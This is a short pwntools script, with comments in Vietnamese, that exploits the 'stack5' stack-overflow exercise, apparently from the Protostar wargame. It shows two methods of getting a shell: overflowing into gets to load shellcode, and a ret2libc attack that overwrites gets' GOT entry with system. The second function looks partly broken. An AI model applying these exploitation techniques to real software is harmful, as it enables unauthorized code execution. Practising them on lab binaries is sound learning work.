from pwn import *
r = process("./stack5")

def shellcode():
	get = 0x080482e8
	shelladdr = 0x08049010
	payload =  "A"*76
	payload += p32(get) 
	payload += p32(shelladdr) 
	payload += p32(shelladdr)
	r.sendline(payload)
	r.sendline(asm(shellcraft.sh()))
	r.interactive()

def ret2libc():
	get_plt = 0x080482e8
	get_got = 0x0804959c
	main = 0x080483c4
	system = 0xf7e3ada0 #test system ASLR 0
	shelladdr = 0x08049010 #addr chua chuoi /bin/sh
	ret_main = 0x080483da
	pop_ret = 0x08048393
	payload = "A"*76
	payload += p32(get_plt)
	payload += p32(main)
	payload += p32(shelladdr) 
	r.sendline(payload)
	r.sendline("/bin/sh") #ghi "/bin/sh" vao trong shelladdr trong vung bss
	payload += "A"*68
	payload += p32(get_plt)
	payload += p32(pop_ret)
	payload += p32(get_got)
	payload += p32(get_plt)
	payload += p32(main)
	payload += p32(shelladdr)

	r.sendline(payload) #ghi de len addr cua gets@libc thanh addr cua system
	r.sendline(p32(system))
	#ret ve main, toi ham gets bi thay thanh system, no lay tham so la vi tri dau tien cua eax
	#minh se de shelladdr o dau tien
	#r.close()
	#count += 1
	r.interactive()
